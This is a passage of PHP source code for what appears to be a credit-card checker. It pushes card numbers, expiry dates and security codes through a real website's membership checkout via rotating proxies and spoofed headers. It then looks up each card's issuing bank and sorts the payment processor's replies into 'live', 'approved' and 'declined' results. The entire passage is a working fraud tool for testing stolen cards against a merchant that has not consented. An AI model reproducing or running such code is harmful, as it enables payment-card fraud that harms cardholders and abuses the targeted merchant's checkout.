Z5UbBG');

// Continue with the rest of the code
$result1 = curl_exec($ch);
$id = trim(strip_tags(GetStr($result1, '"id": "','"')));
curl_close($ch);
$proxy = rebootproxys();
list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.doane.us/membership-account-new/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, "http://$proxyIP:$proxyPort");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPass");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'origin: https://www.doane.us',
    'referer: https://www.doane.us/membership-account-new/membership-checkout/',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'user-agent: ' . $_SERVER['HTTP_USER_AGENT'],
    'x-requested-with: XMLHttpRequest',
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'pmpro_level=2&checkjavascript=1&pmpro_other_discount_code=&username='.$rnd.'tt3&password='.$name.'99007%40&password2='.$name.'99007%40&first_name='.$firstname.'&last_name='.$lastname.'&bemail='.$rnd.'w'.$firstname.'g%40gmail.com&bconfirmemail='.$rnd.'w'.$firstname.'g%40gmail.com&fullname=&pmpropp_chosen_plan=2&CardType=mastercard&pmpro_discount_code=&tos=1&pmpro_checkout_nonce='.$nonce.'&_wp_http_referer=%2Fmembership-account-new%2Fmembership-checkout%2F&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
$result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(GetStr($result2, '"cvc_check":"', '"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cctwo . '');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim_response = curl_exec($ch);
$fim = json_decode($fim_response, true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if (strpos($fim_response, '"type":"credit"') !== false) {
    $type = 'Credit';
} else {
    $type = 'Debit';
}

#cvv

if (strpos($result2, '"cvc_check": "pass"')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED  [𒆜օʄʄɨƈɨǟʟ ƈɦɛƈӄʐ 𒆜 (☯𝙈𝙊𝙃𝙄𝙏𝙄𝙎☯)]
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
} elseif (strpos($result2, 'Thank You For Donation.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED -> Thank You For Donation!! -> [𒆜օʄʄɨƈɨǟʟ ƈɦɛƈӄʐ 𒆜 (☯𝙈𝙊𝙃𝙄𝙏𝙄𝙎☯)]
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
} elseif (strpos($result2, 'Thank You For Donation.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝ Code : Thank You For Donation ➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
        } elseif (strpos($result2, 'Your card has insufficient funds.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
} elseif (strpos($result2, 'Thank You.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝ Thank You. ➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
} elseif (strpos($result2, 'Your card zip code is incorrect.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝ Incorrect Zip Code➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, '/donations/thank_you?donation_number=')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, "incorrect_zip")) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED Incorrect zip ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, '"type":"one-time"')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED Incorrect zip ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'security code is incorrect.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'security code is invalid.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}


elseif (strpos($result2, 'Your card&#039;s security code is incorrect.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'incorrect_cvc')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'stolen_card')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #Declined Stolen_Card ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'cvc_check": "unavailable')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            CVC Check Unavailable ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Invalid API Key provided.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Invalid API Key ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Expired API Key provided.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Expired API Key ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Invalid account number.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Invalid Account Number ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, 'Invalid account.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Invalid Account Number ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}


elseif (strpos($result2, 'Your card was declined.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Card Declined ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'incorrect_number')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Invalid Card Number ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'testmode_charges_only')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Test Mode Charges Only ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

 elseif (strpos($result2, 'The transaction cannot be processed.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Transaction Cannot Be Processed ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'incorrect_cvc')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Incorrect CVC ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'expired_card')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Expired Card ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Your card does not support this type of purchase.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Card Does Not Support Purchase ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'fraudulent')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Fraudulent ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'generic_decline')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Generic Decline ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'do_not_honor')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Do Not Honor ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Your card number is incorrect.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Incorrect Card Number ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'processing_error')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Processing Error ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

